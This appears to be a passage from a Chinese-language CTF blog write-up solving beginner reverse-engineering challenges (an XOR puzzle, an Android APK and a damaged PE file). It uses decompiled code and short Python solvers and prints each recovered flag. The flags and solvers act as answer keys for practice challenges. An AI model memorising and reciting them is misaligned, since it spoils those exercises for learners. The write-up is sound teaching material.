+</span></code></pre><p>并且 array 数组内容如下<pre class=z-code><code><span class="z-text z-plain">array = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
+</span></code></pre><p>通过分析可知密文是通过将明文每四个为一组和 0x12345678 进行异或后得到的，但由于是低位存储，所以需要将每一组逆向过来的值进行反向即可得到 flag，脚本如下<pre class=z-code><code><span class="z-text z-plain">from Crypto.Util.number import long_to_bytes
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">array_data = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
+</span><span class="z-text z-plain">for data in array_data:
+</span><span class="z-text z-plain">    print(bytes(reversed(long_to_bytes(data ^ 0x12345678))).decode(), end='')
+</span><span class="z-text z-plain">    
+</span><span class="z-text z-plain"># flag{llittl_Endian_a}
+</span></code></pre><h3 id=week-1-androxor>[Week 1]AndroXor<a aria-label="Anchor link for: week-1-androxor" class=zola-anchor href=#week-1-androxor style=visibility:hidden></a></h3><blockquote><p>https://apktool.org/<p>https://github.com/skylot/jadx</blockquote><p>可以在上述引用中下载 apktool ，下载后使用 apktool 进行逆向<pre class=z-code><code><span class="z-text z-plain">$ apktool d AndroXor.apk
+</span></code></pre><p>逆向后使用 jadx 打开进行 Java 反编译，在 <code>com/chick.androxor/MainActivity</code> 中存在以下内容<pre class=z-code><code><span class="z-text z-plain">    public String Xor(String str, String str2) {
+</span><span class="z-text z-plain">        char[] cArr = {14, '\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\n', 2, '\f', '>', '(', '@', 11, '\'', 'K', 'Y', 25, 'A', '\r'};
+</span><span class="z-text z-plain">        char[] cArr2 = new char[str.length()];
+</span><span class="z-text z-plain">        String str3 = str.length() != 25 ? "wrong!!!" : "you win!!!";
+</span><span class="z-text z-plain">        for (int i = 0; i < str.length(); i++) {
+</span><span class="z-text z-plain">            char charAt = (char) (str.charAt(i) ^ str2.charAt(i % str2.length()));
+</span><span class="z-text z-plain">            cArr2[i] = charAt;
+</span><span class="z-text z-plain">            if (cArr[i] != charAt) {
+</span><span class="z-text z-plain">                return "wrong!!!";
+</span><span class="z-text z-plain">            }
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">        return str3;
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">	@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+</span><span class="z-text z-plain">    public void onCreate(Bundle bundle) {
+</span><span class="z-text z-plain">        super.onCreate(bundle);
+</span><span class="z-text z-plain">        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
+</span><span class="z-text z-plain">        this.binding = inflate;
+</span><span class="z-text z-plain">        setContentView(inflate.getRoot());
+</span><span class="z-text z-plain">        final EditText editText = (EditText) findViewById(R.id.password);
+</span><span class="z-text z-plain">        ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() { // from class: com.chick.androxor.MainActivity.1
+</span><span class="z-text z-plain">            @Override // android.view.View.OnClickListener
+</span><span class="z-text z-plain">            public void onClick(View view) {
+</span><span class="z-text z-plain">                String obj = editText.getText().toString();
+</span><span class="z-text z-plain">                MainActivity mainActivity = MainActivity.this;
+</span><span class="z-text z-plain">                Toast.makeText(mainActivity, mainActivity.Xor(obj, "happyx3"), 1).show();
+</span><span class="z-text z-plain">                Log.d("输入", editText.getText().toString());
+</span><span class="z-text z-plain">            }
+</span><span class="z-text z-plain">        });
+</span><span class="z-text z-plain">    }
+</span></code></pre><p>通过分析可得明文长度为 25，并且代码将循环遍历明文每一个字符，并使用每个字符与第二个参数字符串(happyx3)的对应位置字符进行异或运算，将得到的新字符添加到 cArr2 中，并且还会将cArr2中的字符与cArr中的对应位置字符进行比较。<p>因此要获得明文需要对应位置逐个异或运算推回来即可，先将 cArr 数字中的其他值都转化为 ascii 值形态，再进行异或运算，将运算结果转回字符即可，脚本如下<pre class=z-code><code><span class="z-text z-plain">cArr = [14, '\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\n', 2, '\f', '>', '(', '@', 11, '\'', 'K', 'Y', 25, 'A', '\r']
+</span><span class="z-text z-plain">str = ""
+</span><span class="z-text z-plain">str2 = "happyx3"
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def convert_to_ord(lst):
+</span><span class="z-text z-plain">    for i in range(len(lst)):
+</span><span class="z-text z-plain">        if not isinstance(lst[i], int):
+</span><span class="z-text z-plain">            lst[i] = ord(lst[i])
+</span><span class="z-text z-plain">    return lst
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">cArr = convert_to_ord(cArr)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">for i in range(25):
+</span><span class="z-text z-plain">    str += chr(cArr[i] ^ ord(str2[i % len(str2)]))
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">print(str)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain"># flag{3z_And0r1d_X0r_x1x1}
+</span></code></pre><h3 id=week-1-ezpe>[Week 1]EzPE<a aria-label="Anchor link for: week-1-ezpe" class=zola-anchor href=#week-1-ezpe style=visibility:hidden></a></h3><p>下载附件后用查壳工具查发现无法查出来，用 010 打开和其他 exe 文件对比发现缺失了文件头部分，需将文件头部分进行修复。<p><img src="https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FMEPGebOjUqq8l8DrWOab%252FEzPE-1.png%3Falt%3Dmedia%26token%3D61a87172-da22-4f40-b6a3-8e554f54118d&width=768&dpr=4&quality=100&sign=77123c2bab2b6b0abfaa19527042e71919efd1de307ccc5a32f152ec991ad61b" alt=img><p>用 ida64 打开，通过反编译可以得到以下内容<pre class=z-code><code><span class="z-text z-plain">int __cdecl main(int argc, const char **argv, const char **envp)
+</span><span class="z-text z-plain">{
+</span><span class="z-text z-plain">  int i; // [rsp+2Ch] [rbp-4h]
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">  _main(argc, argv, envp);
+</span><span class="z-text z-plain">  puts(&draw);
+</span><span class="z-text z-plain">  puts("Please enter your flag!\n");
+</span><span class="z-text z-plain">  scanf("%s", input);
+</span><span class="z-text z-plain">  for ( i = 0; i < strlen(input) - 1; ++i )
+</span><span class="z-text z-plain">    input[i] ^= i ^ input[i + 1];
+</span><span class="z-text z-plain">  if ( !strcmp(input, data) )
+</span><span class="z-text z-plain">    puts("You Win!");
+</span><span class="z-text z-plain">  else
+</span><span class="z-text z-plain">    puts("You lose!");
+</span><span class="z-text z-plain">  system("pause");
+</span><span class="z-text z-plain">  return 0;
+</span><span class="z-text z-plain">}
+</span></code></pre><p>并且 data 数组内容如下<pre class=z-code><code><span class="z-text z-plain">array_data = [
+</span><span class="z-text z-plain">  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C,
+</span><span class="z-text z-plain">  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51,
+</span><span class="z-text z-plain">  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04,
+</span><span class="z-text z-plain">  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D
+</span><span class="z-text z-plain">]
+</span></code></pre><p>通过分析可得密文由将明文的每个字符与其下一个字符以及当前 index 值进行异或运算，并将结果赋值给当前字符，因此要逆向回来只需要倒转反过来即可，脚本如下<pre class=z-code><code><span class="z-text z-plain">array_data = [
+</span><span class="z-text z-plain">  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C,
+</span><span class="z-text z-plain">  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51,
+</span><span class="z-text z-plain">  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04,
+</span><span class="z-text z-plain">  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D
+</span><span class="z-text z-plain">]
+</span><span class="z-text z-plain">print(len(array_data))
+</span><span class="z-text z-plain">for i in range(len(array_data) - 2, 0, -1):
+</span><span class="z-text z-plain">    array_data[i] ^= i ^ array_data[i + 1]
+</span><span class="z-text z-plain">print(''.join(chr(data) for data in array_data))
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain"># flag{Y0u_kn0w_what_1s_PE_File_F0rmat}
+</span></code></pre><h3 id=week-1-lazy-activtiy>[Week 1]lazy_activtiy<a aria-label="Anchor link for: week-1-lazy-activtiy" class=zola-anchor href=#week-1-lazy-activtiy style=visibility:hidden></a></h3><blockquote><p>https://github.com/liaojack8/AndroidKiller</blockquote><p>使用 AndroidKiller 打开后搜索 flag 即可得到 flag。<p><img src="https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FZl7WLJOue4Uv9zlfSF1T%252Flazy_activtiy-1.png%3Falt%3Dmedia%26token%3D36498bef-15b7-4f75-a37b-1e899525c9b5&width=768&dpr=4&quality=100&sign=7a8856c106556e0aeea2da78dd92d611d36371a3bf0417237ca6d33703e40e46" alt=img><pre class=z-code><code><span class="z-text z-plain">flag{Act1v1ty_!s_so00oo0o_Impor#an#}
+</span></code></pre><h3><a aria-label="Anchor link for: " class=zola-anchor href=# style=visibility:hidden></a></h3></article><div class="reaction right" data-endpoint="https://reaction.woaikanpika123.workers.dev "></div><div class=giscus></div><script async crossorigin data-category=General data-category-id=DIC_kwDONtXUfc4CrRaB data-emit-metadata=0 data-input-position=bottom data-lang=en data-mapping=pathname data-reactions-enabled=1 data-repo=lbsucceed/lbsucceed.github.io data-repo-id=R_kgDONtXUfQ data-strict=0 data-theme=noborder_light src=https://giscus.app/client.js></script></div><footer><div class=copyright><p>© 2025 lbsucceed</div></footer></main></div><script src=/js/lightense.min.js></script><script type=module>import a from"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs";a.initialize({startOnLoad:!0})</script><script src=/js/main.js></script>
